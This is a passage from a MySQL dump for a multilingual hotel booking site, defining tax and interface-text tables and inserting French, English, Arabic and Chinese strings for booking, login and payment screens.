) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_tax`
--

CREATE TABLE `pm_tax` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `name` varchar(50) DEFAULT NULL,
  `value` double DEFAULT 0,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_tax`
--

INSERT INTO `pm_tax` (`id`, `lang`, `name`, `value`, `checked`, `rank`) VALUES
(1, 1, 'TVA', 10, 2, 1),
(1, 2, 'VAT', 10, 2, 1),
(1, 3, 'VAT', 10, 2, 1),
(1, 5, 'VAT', 10, 2, 1),
(2, 2, '假日稅', 20, 1, 2),
(2, 5, '假日稅', 20, 1, 2);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_text`
--

CREATE TABLE `pm_text` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `name` varchar(50) DEFAULT NULL,
  `value` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_text`
--

INSERT INTO `pm_text` (`id`, `lang`, `name`, `value`) VALUES
(1, 1, 'CREATION', 'Création'),
(1, 2, 'CREATION', 'Creation'),
(1, 3, 'CREATION', 'إنشاء'),
(1, 5, 'CREATION', 'Creation'),
(2, 1, 'MESSAGE', 'Message'),
(2, 2, 'MESSAGE', '訊息'),
(2, 3, 'MESSAGE', 'رسالة'),
(2, 5, 'MESSAGE', '訊息'),
(3, 1, 'EMAIL', 'E-mail'),
(3, 2, 'EMAIL', '電子郵件'),
(3, 3, 'EMAIL', 'بَرِيدٌ إلِكْترونيّ'),
(3, 5, 'EMAIL', '電子郵件'),
(4, 1, 'PHONE', 'Tél.'),
(4, 2, 'PHONE', '電話'),
(4, 3, 'PHONE', 'رقم هاتف'),
(4, 5, 'PHONE', '電話'),
(5, 1, 'FAX', 'Fax'),
(5, 2, 'FAX', '傳真'),
(5, 3, 'FAX', 'فاكس'),
(5, 5, 'FAX', '傳真'),
(6, 1, 'COMPANY', 'Société'),
(6, 2, 'COMPANY', '公司'),
(6, 3, 'COMPANY', 'مشروع'),
(6, 5, 'COMPANY', '公司'),
(7, 1, 'COPY_CODE', 'Recopiez le code'),
(7, 2, 'COPY_CODE', '複製代碼'),
(7, 3, 'COPY_CODE', 'رمز الأمان'),
(7, 5, 'COPY_CODE', '複製代碼'),
(8, 1, 'SUBJECT', 'Sujet'),
(8, 2, 'SUBJECT', '主旨'),
(8, 3, 'SUBJECT', 'موضوع'),
(8, 5, 'SUBJECT', '主旨'),
(9, 1, 'REQUIRED_FIELD', 'Champ requis'),
(9, 2, 'REQUIRED_FIELD', '必填欄位'),
(9, 3, 'REQUIRED_FIELD', 'الحقل المطلوب'),
(9, 5, 'REQUIRED_FIELD', '必填欄位'),
(10, 1, 'INVALID_CAPTCHA_CODE', 'Le code de sécurité saisi est incorrect'),
(10, 2, 'INVALID_CAPTCHA_CODE', '無效的驗證代碼'),
(10, 3, 'INVALID_CAPTCHA_CODE', 'رمز الحماية أدخلته غير صحيح'),
(10, 5, 'INVALID_CAPTCHA_CODE', '無效的驗證代碼'),
(11, 1, 'INVALID_EMAIL', 'Adresse e-mail invalide'),
(11, 2, 'INVALID_EMAIL', '無效的電子郵件地址'),
(11, 3, 'INVALID_EMAIL', 'بريد إلكتروني خاطئ'),
(11, 5, 'INVALID_EMAIL', '無效的電子郵件地址'),
(12, 1, 'FIRSTNAME', 'Prénom'),
(12, 2, 'FIRSTNAME', '名字'),
(12, 3, 'FIRSTNAME', 'الاسم الأول'),
(12, 5, 'FIRSTNAME', '名字'),
(13, 1, 'LASTNAME', 'Nom'),
(13, 2, 'LASTNAME', '姓氏'),
(13, 3, 'LASTNAME', 'اسم العائلة'),
(13, 5, 'LASTNAME', '姓氏'),
(14, 1, 'ADDRESS', 'Adresse'),
(14, 2, 'ADDRESS', '地址'),
(14, 3, 'ADDRESS', 'عنوان الشارع'),
(14, 5, 'ADDRESS', '地址'),
(15, 1, 'POSTCODE', 'Code postal'),
(15, 2, 'POSTCODE', '郵遞區號'),
(15, 3, 'POSTCODE', 'الرمز البريدي'),
(15, 5, 'POSTCODE', '郵遞區號'),
(16, 1, 'CITY', 'Ville'),
(16, 2, 'CITY', '城市'),
(16, 3, 'CITY', 'مدينة'),
(16, 5, 'CITY', '城市'),
(17, 1, 'MOBILE', 'Portable'),
(17, 2, 'MOBILE', '行動電話'),
(17, 3, 'MOBILE', 'هاتف'),
(17, 5, 'MOBILE', '行動電話'),
(18, 1, 'ADD', 'Ajouter'),
(18, 2, 'ADD', '添加'),
(18, 3, 'ADD', 'إضافة على'),
(18, 5, 'ADD', '添加'),
(19, 1, 'EDIT', 'Modifier'),
(19, 2, 'EDIT', '編輯'),
(19, 3, 'EDIT', 'تغيير'),
(19, 5, 'EDIT', '編輯'),
(20, 1, 'INVALID_INPUT', 'Saisie invalide'),
(20, 2, 'INVALID_INPUT', '輸入無效'),
(20, 3, 'INVALID_INPUT', 'إدخال غير صالح'),
(20, 5, 'INVALID_INPUT', '輸入無效'),
(21, 1, 'MAIL_DELIVERY_FAILURE', 'Echec lors de l\'envoi du message.'),
(21, 2, 'MAIL_DELIVERY_FAILURE', 'A failure occurred during the delivery of this message.'),
(21, 3, 'MAIL_DELIVERY_FAILURE', 'حدث فشل أثناء تسليم هذه الرسالة.'),
(21, 5, 'MAIL_DELIVERY_FAILURE', 'A failure occurred during the delivery of this message.'),
(22, 1, 'MAIL_DELIVERY_SUCCESS', 'Merci de votre intérêt, votre message a bien été envoyé.\nNous vous contacterons dans les plus brefs délais.'),
(22, 2, 'MAIL_DELIVERY_SUCCESS', 'Thank you for your interest, your message has been sent.\nWe will contact you as soon as possible.'),
(22, 3, 'MAIL_DELIVERY_SUCCESS', 'خزان لاهتمامك ، تم إرسال رسالتك . سوف نتصل بك في أقرب وقت ممكن .'),
(22, 5, 'MAIL_DELIVERY_SUCCESS', 'Thank you for your interest, your message has been sent.\nWe will contact you as soon as possible.'),
(23, 1, 'SEND', 'Envoyer'),
(23, 2, 'SEND', '發送'),
(23, 3, 'SEND', 'ارسل انت'),
(23, 5, 'SEND', '發送'),
(24, 1, 'FORM_ERRORS', 'Le formulaire comporte des erreurs.'),
(24, 2, 'FORM_ERRORS', '紅色方框為必填欄位'),
(24, 3, 'FORM_ERRORS', 'النموذج التالي يحتوي على بعض الأخطاء.'),
(24, 5, 'FORM_ERRORS', '紅色方框為必填欄位'),
(25, 1, 'FROM_DATE', 'Du'),
(25, 2, 'FROM_DATE', '最低'),
(25, 3, 'FROM_DATE', 'من'),
(25, 5, 'FROM_DATE', '最低'),
(26, 1, 'TO_DATE', 'au'),
(26, 2, 'TO_DATE', 'till'),
(26, 3, 'TO_DATE', 'حتى'),
(26, 5, 'TO_DATE', 'till'),
(27, 1, 'FROM', 'De'),
(27, 2, 'FROM', '最低'),
(27, 3, 'FROM', 'من'),
(27, 5, 'FROM', '最低'),
(28, 1, 'TO', 'à'),
(28, 2, 'TO', 'to'),
(28, 3, 'TO', 'إلى'),
(28, 5, 'TO', 'to'),
(29, 1, 'BOOK', 'Réserver'),
(29, 2, 'BOOK', '訂房'),
(29, 3, 'BOOK', 'للحجز'),
(29, 5, 'BOOK', '訂房'),
(30, 1, 'READMORE', 'Lire la suite'),
(30, 2, 'READMORE', '房型資訊'),
(30, 3, 'READMORE', 'اقرأ المزيد'),
(30, 5, 'READMORE', '房型資訊'),
(31, 1, 'BACK', 'Retour'),
(31, 2, 'BACK', '返回'),
(31, 3, 'BACK', 'عودة'),
(31, 5, 'BACK', '返回'),
(32, 1, 'DISCOVER', 'Découvrir'),
(32, 2, 'DISCOVER', '發現'),
(32, 3, 'DISCOVER', 'اكتشف'),
(32, 5, 'DISCOVER', '發現'),
(33, 1, 'ALL', 'Tous'),
(33, 2, 'ALL', '所有'),
(33, 3, 'ALL', 'كل'),
(33, 5, 'ALL', '所有'),
(34, 1, 'ALL_RIGHTS_RESERVED', 'Tous droits réservés'),
(34, 2, 'ALL_RIGHTS_RESERVED', '版權所有'),
(34, 3, 'ALL_RIGHTS_RESERVED', 'جميع الحقوق محفوظه'),
(34, 5, 'ALL_RIGHTS_RESERVED', '版權所有'),
(35, 1, 'FORGOTTEN_PASSWORD', 'Mot de passe oublié ?'),
(35, 2, 'FORGOTTEN_PASSWORD', '忘記密碼？'),
(35, 3, 'FORGOTTEN_PASSWORD', 'هل نسيت كلمة المرور؟'),
(35, 5, 'FORGOTTEN_PASSWORD', '忘記密碼？'),
(36, 1, 'LOG_IN', 'Connexion'),
(36, 2, 'LOG_IN', '登入'),
(36, 3, 'LOG_IN', 'تسجيل الدخول'),
(36, 5, 'LOG_IN', '登入'),
(37, 1, 'SIGN_UP', 'Inscription'),
(37, 2, 'SIGN_UP', '註冊'),
(37, 3, 'SIGN_UP', 'تسجيل'),
(37, 5, 'SIGN_UP', '註冊'),
(38, 1, 'LOG_OUT', 'Déconnexion'),
(38, 2, 'LOG_OUT', '登出'),
(38, 3, 'LOG_OUT', 'تسجيل الخروج'),
(38, 5, 'LOG_OUT', '登出'),
(39, 1, 'SEARCH', 'Rechercher'),
(39, 2, 'SEARCH', '搜尋'),
(39, 3, 'SEARCH', 'ابحث عن'),
(39, 5, 'SEARCH', '搜尋'),
(40, 1, 'RESET_PASS_SUCCESS', 'Votre nouveau mot de passe vous a été envoyé sur votre adresse e-mail.'),
(40, 2, 'RESET_PASS_SUCCESS', '您的新密碼已通過您的電子郵件發送給您。'),
(40, 3, 'RESET_PASS_SUCCESS', 'تم إرسال كلمة المرور الجديدة إلى عنوان البريد الإلكتروني الخاص بك'),
(40, 5, 'RESET_PASS_SUCCESS', '您的新密碼已通過您的電子郵件發送給您。'),
(41, 1, 'PASS_TOO_SHORT', 'Le mot de passe doit contenir 6 caractères au minimum'),
(41, 2, 'PASS_TOO_SHORT', 'The password must contain 6 characters at least'),
(41, 3, 'PASS_TOO_SHORT', 'يجب أن يحتوي على كلمة المرور ستة أحرف على الأقل'),
(41, 5, 'PASS_TOO_SHORT', 'The password must contain 6 characters at least'),
(42, 1, 'PASS_DONT_MATCH', 'Les mots de passe doivent correspondre'),
(42, 2, 'PASS_DONT_MATCH', '密碼不符'),
(42, 3, 'PASS_DONT_MATCH', 'يجب أن تتطابق كلمات المرور'),
(42, 5, 'PASS_DONT_MATCH', '密碼不符'),
(43, 1, 'ACCOUNT_EXISTS', 'Un compte existe déjà avec cette adresse e-mail'),
(43, 2, 'ACCOUNT_EXISTS', '此電子郵件已被其他帳戶註冊'),
(43, 3, 'ACCOUNT_EXISTS', 'حساب موجود بالفعل مع هذا عنوان البريد الإلكتروني'),
(43, 5, 'ACCOUNT_EXISTS', '此電子郵件已被其他帳戶註冊'),
(44, 1, 'ACCOUNT_CREATED', 'Votre compte a bien été créé. Vous allez recevoir un email de confirmation. Cliquez sur le lien de cet e-mail pour confirmer votre compte avant de continuer.'),
(44, 2, 'ACCOUNT_CREATED', '您的帳號已經建立。您將收到一封確認電子郵件。點擊此電子郵件中的連結以確認您的帳戶，然後再繼續。'),
(44, 3, 'ACCOUNT_CREATED', 'Your account has been created. You will receive a confirmation email. Click on the link in this email to confirm your account before continuing.'),
(44, 5, 'ACCOUNT_CREATED', '您的帳號已經建立。您將收到一封確認電子郵件。點擊此電子郵件中的連結以確認您的帳戶，然後再繼續。'),
(45, 1, 'INCORRECT_LOGIN', 'Les informations de connexion sont incorrectes.'),
(45, 2, 'INCORRECT_LOGIN', '不正確的登入資訊'),
(45, 3, 'INCORRECT_LOGIN', 'معلومات تسجيل الدخول غير صحيحة.'),
(45, 5, 'INCORRECT_LOGIN', '不正確的登入資訊'),
(46, 1, 'I_SIGN_UP', 'Je m\'inscris'),
(46, 2, 'I_SIGN_UP', '我要註冊'),
(46, 3, 'I_SIGN_UP', 'يمكنني الاشتراك'),
(46, 5, 'I_SIGN_UP', '我要註冊'),
(47, 1, 'ALREADY_HAVE_ACCOUNT', 'J\'ai déjà un compte'),
(47, 2, 'ALREADY_HAVE_ACCOUNT', '我已有帳號'),
(47, 3, 'ALREADY_HAVE_ACCOUNT', 'لدي بالفعل حساب'),
(47, 5, 'ALREADY_HAVE_ACCOUNT', '我已有帳號'),
(48, 1, 'MY_ACCOUNT', 'Mon compte'),
(48, 2, 'MY_ACCOUNT', '帳戶申請'),
(48, 3, 'MY_ACCOUNT', 'حسابي'),
(48, 5, 'MY_ACCOUNT', '帳戶申請'),
(49, 1, 'COMMENTS', 'Commentaires'),
(49, 2, 'COMMENTS', '評論'),
(49, 3, 'COMMENTS', 'تعليقات'),
(49, 5, 'COMMENTS', '評論'),
(50, 1, 'LET_US_KNOW', 'Faîtes-nous savoir ce que vous pensez'),
(50, 2, 'LET_US_KNOW', '詢問房型或住宿相關問題'),
(50, 3, 'LET_US_KNOW', 'ماذا عن رايك؟'),
(50, 5, 'LET_US_KNOW', '詢問房型或住宿相關問題'),
(51, 1, 'COMMENT_SUCCESS', 'Merci de votre intérêt, votre commentaire va être soumis à validation.'),
(51, 2, 'COMMENT_SUCCESS', 'Thank you for your interest, your comment will be checked.'),
(51, 3, 'COMMENT_SUCCESS', 'شكرا ل اهتمامك، و سيتم التحقق من صحة للتعليق.'),
(51, 5, 'COMMENT_SUCCESS', 'Thank you for your interest, your comment will be checked.'),
(52, 1, 'NO_SEARCH_RESULT', 'Aucun résultat. Vérifiez l\'orthographe des termes de recherche (> 3 caractères) ou essayez d\'autres mots.'),
(52, 2, 'NO_SEARCH_RESULT', 'No result. Check the spelling terms of search (> 3 characters) or try other words.'),
(52, 3, 'NO_SEARCH_RESULT', 'لا نتيجة. التدقيق الإملائي للكلمات (أكثر من ثلاثة أحرف ) أو محاولة بعبارة أخرى .'),
(52, 5, 'NO_SEARCH_RESULT', 'No result. Check the spelling terms of search (> 3 characters) or try other words.'),
(53, 1, 'SEARCH_EXCEEDED', 'Nombre de recherches dépassé.'),
(53, 2, 'SEARCH_EXCEEDED', 'Number of researches exceeded.'),
(53, 3, 'SEARCH_EXCEEDED', 'عدد من الأبحاث السابقة .'),
(53, 5, 'SEARCH_EXCEEDED', 'Number of researches exceeded.'),
(54, 1, 'SECONDS', 'secondes'),
(54, 2, 'SECONDS', 'seconds'),
(54, 3, 'SECONDS', 'ثواني'),
(54, 5, 'SECONDS', 'seconds'),
(55, 1, 'FOR_A_TOTAL_OF', 'sur un total de'),
(55, 2, 'FOR_A_TOTAL_OF', 'for a total of'),
(55, 3, 'FOR_A_TOTAL_OF', 'من الكل'),
(55, 5, 'FOR_A_TOTAL_OF', 'for a total of'),
(56, 1, 'COMMENT', 'Commentaire'),
(56, 2, 'COMMENT', '請寫下您的疑問'),
(56, 3, 'COMMENT', 'تعقيب'),
(56, 5, 'COMMENT', '請寫下您的疑問'),
(57, 1, 'VIEW', 'Visionner'),
(57, 2, 'VIEW', '檢視'),
(57, 3, 'VIEW', 'ل عرض'),
(57, 5, 'VIEW', '檢視'),
(58, 1, 'RECENT_ARTICLES', 'Articles récents'),
(58, 2, 'RECENT_ARTICLES', '最近的文章'),
(58, 3, 'RECENT_ARTICLES', 'المقالات الأخيرة'),
(58, 5, 'RECENT_ARTICLES', '最近的文章'),
(59, 1, 'RSS_FEED', 'Flux RSS'),
(59, 2, 'RSS_FEED', 'RSS feed'),
(59, 3, 'RSS_FEED', 'تغذية RSS'),
(59, 5, 'RSS_FEED', 'RSS feed'),
(60, 1, 'COUNTRY', 'Pays'),
(60, 2, 'COUNTRY', '國家'),
(60, 3, 'COUNTRY', 'Country'),
(60, 5, 'COUNTRY', '國家'),
(61, 1, 'ROOM', 'Chambre'),
(61, 2, 'ROOM', '客房'),
(61, 3, 'ROOM', 'Room'),
(61, 5, 'ROOM', '客房'),
(62, 1, 'INCL_VAT', 'TTC'),
(62, 2, 'INCL_VAT', '已含稅'),
(62, 3, 'INCL_VAT', 'incl. VAT'),
(62, 5, 'INCL_VAT', '已含稅'),
(63, 1, 'NIGHTS', 'nuit(s)'),
(63, 2, 'NIGHTS', '晚'),
(63, 3, 'NIGHTS', 'night(s)'),
(63, 5, 'NIGHTS', '晚'),
(64, 1, 'ADULTS', 'Adultes'),
(64, 2, 'ADULTS', '成人'),
(64, 3, 'ADULTS', 'Adults'),
(64, 5, 'ADULTS', '成人'),
(65, 1, 'CHILDREN', 'Enfants'),
(65, 2, 'CHILDREN', '孩童'),
(65, 3, 'CHILDREN', 'Children'),
(65, 5, 'CHILDREN', '孩童'),
(66, 1, 'PERSONS', 'personnes'),
(66, 2, 'PERSONS', '人'),
(66, 3, 'PERSONS', 'persons'),
(66, 5, 'PERSONS', '人'),
(67, 1, 'CONTACT_DETAILS', 'Coordonnées'),
(67, 2, 'CONTACT_DETAILS', '聯絡細節'),
(67, 3, 'CONTACT_DETAILS', 'Contact details'),
(67, 5, 'CONTACT_DETAILS', '聯絡細節'),
(68, 1, 'NO_AVAILABILITY', 'Aucune disponibilité'),
(68, 2, 'NO_AVAILABILITY', '此房型已客滿'),
(68, 3, 'NO_AVAILABILITY', 'No availability'),
(68, 5, 'NO_AVAILABILITY', '此房型已客滿'),
(69, 1, 'AVAILABILITIES', 'Disponibilités'),
(69, 2, 'AVAILABILITIES', 'Availabilities'),
(69, 3, 'AVAILABILITIES', 'Availabilities'),
(69, 5, 'AVAILABILITIES', 'Availabilities'),
(70, 1, 'CHECK', 'Vérifier'),
(70, 2, 'CHECK', '查詢空房'),
(70, 3, 'CHECK', 'Check'),
(70, 5, 'CHECK', '查詢空房'),
(71, 1, 'BOOKING_DETAILS', 'Détails de la réservation'),
(71, 2, 'BOOKING_DETAILS', '訂房內容'),
(71, 3, 'BOOKING_DETAILS', 'Booking details'),
(71, 5, 'BOOKING_DETAILS', '訂房內容'),
(72, 1, 'SPECIAL_REQUESTS', 'Demandes spéciales'),
(72, 2, 'SPECIAL_REQUESTS', '備註'),
(72, 3, 'SPECIAL_REQUESTS', 'Special requests'),
(72, 5, 'SPECIAL_REQUESTS', '備註'),
(73, 1, 'PREVIOUS_STEP', 'Étape précédente'),
(73, 2, 'PREVIOUS_STEP', '回上一步'),
(73, 3, 'PREVIOUS_STEP', 'Previous step'),
(73, 5, 'PREVIOUS_STEP', '回上一步'),
(74, 1, 'CONFIRM_BOOKING', 'Confirmer la réservation'),
(74, 2, 'CONFIRM_BOOKING', '確認訂房'),
(74, 3, 'CONFIRM_BOOKING', 'Confirm the booking'),
(74, 5, 'CONFIRM_BOOKING', '確認訂房'),
(75, 1, 'ALSO_DISCOVER', 'Découvrez aussi'),
(75, 2, 'ALSO_DISCOVER', '其他房型'),
(75, 3, 'ALSO_DISCOVER', 'Also discover'),
(75, 5, 'ALSO_DISCOVER', '其他房型'),
(76, 1, 'CHECK_PEOPLE', 'Merci de vérifier le nombre de personnes pour l\'hébergement choisi.'),
(76, 2, 'CHECK_PEOPLE', '請確認所選人數...'),
(76, 3, 'CHECK_PEOPLE', 'Please verify the number of people for the chosen accommodation'),
(76, 5, 'CHECK_PEOPLE', '請確認所選人數...'),
(77, 1, 'BOOKING', 'Réservation'),
(77, 2, 'BOOKING', '訂房'),
(77, 3, 'BOOKING', 'Booking'),
(77, 5, 'BOOKING', '訂房'),
(78, 1, 'NIGHT', 'nuit'),
(78, 2, 'NIGHT', '晚 (起)'),
(78, 3, 'NIGHT', 'night'),
(78, 5, 'NIGHT', '晚 (起)'),
(79, 1, 'WEEK', 'semaine'),
(79, 2, 'WEEK', '週'),
(79, 3, 'WEEK', 'week'),
(79, 5, 'WEEK', '週'),
(80, 1, 'EXTRA_SERVICES', 'Services supplémentaires'),
(80, 2, 'EXTRA_SERVICES', '額外服務\r\n'),
(80, 3, 'EXTRA_SERVICES', 'Extra services'),
(80, 5, 'EXTRA_SERVICES', '額外服務\r\n'),
(81, 1, 'BOOKING_TERMS', ''),
(81, 2, 'BOOKING_TERMS', '訂房條款'),
(81, 3, 'BOOKING_TERMS', ''),
(81, 5, 'BOOKING_TERMS', '訂房條款'),
(82, 1, 'NEXT_STEP', 'Étape suivante'),
(82, 2, 'NEXT_STEP', '前往下一步'),
(82, 3, 'NEXT_STEP', 'Next step'),
(82, 5, 'NEXT_STEP', '前往下一步'),
(83, 1, 'TOURIST_TAX', 'Taxe de séjour'),
(83, 2, 'TOURIST_TAX', 'Tourist tax'),
(83, 3, 'TOURIST_TAX', 'Tourist tax'),
(83, 5, 'TOURIST_TAX', 'Tourist tax'),
(84, 1, 'CHECK_IN', 'Arrivée'),
(84, 2, 'CHECK_IN', '入住'),
(84, 3, 'CHECK_IN', 'Check in'),
(84, 5, 'CHECK_IN', '入住'),
(85, 1, 'CHECK_OUT', 'Départ'),
(85, 2, 'CHECK_OUT', '退房'),
(85, 3, 'CHECK_OUT', 'Check out'),
(85, 5, 'CHECK_OUT', '退房'),
(86, 1, 'TOTAL', 'Total'),
(86, 2, 'TOTAL', '總額'),
(86, 3, 'TOTAL', 'Total'),
(86, 5, 'TOTAL', '總額'),
(87, 1, 'CAPACITY', 'Capacité'),
(87, 2, 'CAPACITY', '入住人數'),
(87, 3, 'CAPACITY', 'Capacity'),
(87, 5, 'CAPACITY', '入住人數'),
(88, 1, 'FACILITIES', 'Équipements'),
(88, 2, 'FACILITIES', '設施'),
(88, 3, 'FACILITIES', 'Facilities'),
(88, 5, 'FACILITIES', '設施'),
(89, 1, 'PRICE', 'Prix'),
(89, 2, 'PRICE', '定價'),
(89, 3, 'PRICE', 'Price'),
(89, 5, 'PRICE', '定價'),
(90, 1, 'MORE_DETAILS', 'Plus d\'infos'),
(90, 2, 'MORE_DETAILS', '房型資訊'),
(90, 3, 'MORE_DETAILS', 'More details'),
(90, 5, 'MORE_DETAILS', '房型資訊'),
(91, 1, 'FROM_PRICE', 'À partir de'),
(91, 2, 'FROM_PRICE', ' '),
(91, 3, 'FROM_PRICE', 'From'),
(91, 5, 'FROM_PRICE', ' '),
(92, 1, 'AMOUNT', 'Montant'),
(92, 2, 'AMOUNT', 'Amount'),
(92, 3, 'AMOUNT', 'Amount'),
(92, 5, 'AMOUNT', 'Amount'),
(93, 1, 'PAY', 'Payer'),
(93, 2, 'PAY', 'Check out'),
(93, 3, 'PAY', 'Check out'),
(93, 5, 'PAY', 'Check out'),
(94, 1, 'PAYMENT_PAYPAL_NOTICE', 'Cliquez sur \"Payer\" ci-dessous, vous allez être redirigé vers le site sécurisé de PayPal'),
(94, 2, 'PAYMENT_PAYPAL_NOTICE', 'Click on \"Check Out\" below, you will be redirected towards the secure site of PayPal'),
(94, 3, 'PAYMENT_PAYPAL_NOTICE', 'Click on \"Check Out\" below, you will be redirected towards the secure site of PayPal'),
(94, 5, 'PAYMENT_PAYPAL_NOTICE', 'Click on \"Check Out\" below, you will be redirected towards the secure site of PayPal'),
(95, 1, 'PAYMENT_CANCEL_NOTICE', 'Le paiement a été annulé.<br>Merci de votre visite et à bientôt.'),
(95, 2, 'PAYMENT_CANCEL_NOTICE', 'The payment has been cancelled.<br>Thank you for your visit and see you soon.'),
(95, 3, 'PAYMENT_CANCEL_NOTICE', 'The payment has been cancelled.<br>Thank you for your visit and see you soon.'),
(95, 5, 'PAYMENT_CANCEL_NOTICE', 'The payment has been cancelled.<br>Thank you for your visit and see you soon.'),
(96, 1, 'PAYMENT_SUCCESS_NOTICE', 'Le paiement a été réalisé avec succès.<br>Merci de votre visite et à bientôt !'),
(96, 2, 'PAYMENT_SUCCESS_NOTICE', 'Your payment has been successfully processed.<br>Thank you for your visit and see you soon!'),
(96, 3, 'PAYMENT_SUCCESS_NOTICE', 'Your payment has been successfully processed.<br>Thank you for your visit and see you soon!'),
(96, 5, 'PAYMENT_SUCCESS_NOTICE', 'Your payment has been successfully processed.<br>Thank you for your visit and see you soon!'),
(97, 1, 'BILLING_ADDRESS', 'Adresse de facturation'),
(97, 2, 'BILLING_ADDRESS', '住房者資訊'),
(97, 3, 'BILLING_ADDRESS', 'Billing address'),
(97, 5, 'BILLING_ADDRESS', '住房者資訊'),
(98, 1, 'DOWN_PAYMENT', 'Acompte'),
(98, 2, 'DOWN_PAYMENT', 'Down payment'),
(98, 3, 'DOWN_PAYMENT', 'Down payment'),
(98, 5, 'DOWN_PAYMENT', 'Down payment'),
(99, 1, 'PAYMENT_CHECK_NOTICE', 'Merci d\'envoyer un chèque à \"Panda Resort, Santorini 847 00, Greece\" d\'un montant de {amount}.<br>Votre réservation sera validée à réception du paiement.<br>Merci de votre visite et à bientôt !'),
(99, 2, 'PAYMENT_CHECK_NOTICE', 'Thank you for sending a check of {amount} to \"Panda Resort, Santorini 847 00, Greece\".<br>Your reservation will be confirmed upon receipt of the payment.<br>Thank you for your visit and see you soon!'),
(99, 3, 'PAYMENT_CHECK_NOTICE', 'Thank you for sending a check of {amount} to \"Panda Resort, Santorini 847 00, Greece\".<br>Your reservation will be confirmed upon receipt of the payment.<br>Thank you for your visit and see you soon!'),
(99, 5, 'PAYMENT_CHECK_NOTICE', 'Thank you for sending a check of {amount} to \"Panda Resort, Santorini 847 00, Greece\".<br>Your reservation will be confirmed upon receipt of the payment.<br>Thank you for your visit and see you soon!'),
(100, 1, 'PAYMENT_ARRIVAL_NOTICE', 'Veuillez régler le solde de votre réservation d\'un montant de {amount} à votre arrivée.<br>Merci de votre visite et à bientôt !'),
(100, 2, 'PAYMENT_ARRIVAL_NOTICE', '感謝您的訂房，費用{amount}將在您入住時以刷卡或現金收取，若特殊情況下須先收取訂金或該房型已客滿將會事前通知您，若無通知則不收取訂金及訂單成立喔。<br>非常感謝您支持愛馨公益旅店，我們誠摯觀迎您的到來！<br>以下注意事項請您務必留意：<br>1.無需預付訂金，我們將提前一天致電給您，確認入住訊息。<br>2.入住時間為下午3點至晚間8點，退房時間為中午12點前。<br>3.晚間8點過後無櫃台人員與客服專線，若需要超過此入住時間，請務必提前通知，謝謝！<br>誠摯感謝您選擇愛馨會館，我們在此期待您的到來。'),
(100, 3, 'PAYMENT_ARRIVAL_NOTICE', 'Thank you for paying the balance of {amount} for your booking on your arrival.<br>Thank you for your visit and see you soon!'),
(100, 5, 'PAYMENT_ARRIVAL_NOTICE', '感謝您的訂房，費用{amount}將在您入住時以刷卡或現金收取，若特殊情況下須先收取訂金或該房型已客滿將會事前通知您，若無通知則不收取訂金及訂單成立喔。<br>非常感謝您支持愛馨公益旅店，我們誠摯觀迎您的到來！<br>以下注意事項請您務必留意：<br>1.無需預付訂金，我們將提前一天致電給您，確認入住訊息。<br>2.入住時間為下午3點至晚間8點，退房時間為中午12點前。<br>3.晚間8點過後無櫃台人員與客服專線，若需要超過此入住時間，請務必提前通知，謝謝！<br>誠摯感謝您選擇愛馨會館，我們在此期待您的到來。'),
(101, 1, 'MAX_PEOPLE', 'Pers. max'),
(101, 2, 'MAX_PEOPLE', '最多容納人數'),
(101, 3, 'MAX_PEOPLE', 'Max people'),
(101, 5, 'MAX_PEOPLE', '最多容納人數'),
(102, 1, 'VAT_AMOUNT', 'Dont TVA'),
(102, 2, 'VAT_AMOUNT', '含稅總額'),
(102, 3, 'VAT_AMOUNT', 'VAT amount'),
(102, 5, 'VAT_AMOUNT', '含稅總額'),
(103, 1, 'MIN_NIGHTS', 'Nuits min'),
(103, 2, 'MIN_NIGHTS', '最少入住晚數'),
(103, 3, 'MIN_NIGHTS', 'Min nights'),
(103, 5, 'MIN_NIGHTS', '最少入住晚數'),
(104, 1, 'MIN_PEOPLE', 'Pers. min'),
(104, 2, 'MIN_PEOPLE', '最少容納人數'),
(104, 3, 'MIN_PEOPLE', 'Min people'),
(104, 5, 'MIN_PEOPLE', '最少容納人數'),
(105, 1, 'RATINGS', 'Note(s)'),
(105, 2, 'RATINGS', '評分'),
(105, 3, 'RATINGS', 'Rating(s)'),
(105, 5, 'RATINGS', '評分'),
(106, 1, 'MAKE_A_REQUEST', 'Faire une demande'),
(106, 2, 'MAKE_A_REQUEST', '發出請求'),
(106, 3, 'MAKE_A_REQUEST', 'Make a request'),
(106, 5, 'MAKE_A_REQUEST', '發出請求'),
(109, 1, 'FULLNAME', 'Nom complet'),
(109, 2, 'FULLNAME', '全名'),
(109, 3, 'FULLNAME', 'Full Name'),
(109, 5, 'FULLNAME', '全名'),
(110, 1, 'PASSWORD', 'Mot de passe'),
(110, 2, 'PASSWORD', '密碼'),
(110, 3, 'PASSWORD', 'Password'),
(110, 5, 'PASSWORD', '密碼'),
(111, 1, 'LOG_IN_WITH_FACEBOOK', 'Enregistrez-vous avec Facebook'),
(111, 2, 'LOG_IN_WITH_FACEBOOK', '以 Facebook 帳戶登入'),
(111, 3, 'LOG_IN_WITH_FACEBOOK', 'Log in with Facebook'),
(111, 5, 'LOG_IN_WITH_FACEBOOK', '以 Facebook 帳戶登入'),
(112, 1, 'OR', 'Ou'),
(112, 2, 'OR', '或'),
(112, 3, 'OR', 'Or'),
(112, 5, 'OR', '或'),
(113, 1, 'NEW_PASSWORD', 'Nouveau mot de passe'),
(113, 2, 'NEW_PASSWORD', '新密碼'),
(113, 3, 'NEW_PASSWORD', 'New password'),
(113, 5, 'NEW_PASSWORD', '新密碼'),
(114, 1, 'NEW_PASSWORD_NOTICE', 'Merci d\'entrer l\'adresse e-mail correspondant à votre compte. Un nouveau mot de passe vous sera envoyé par e-mail.'),
(114, 2, 'NEW_PASSWORD_NOTICE', 'Please enter your e-mail address corresponding to your account. A new password will be sent to you by e-mail.'),
(114, 3, 'NEW_PASSWORD_NOTICE', 'Please enter your e-mail address corresponding to your account. A new password will be sent to you by e-mail.'),
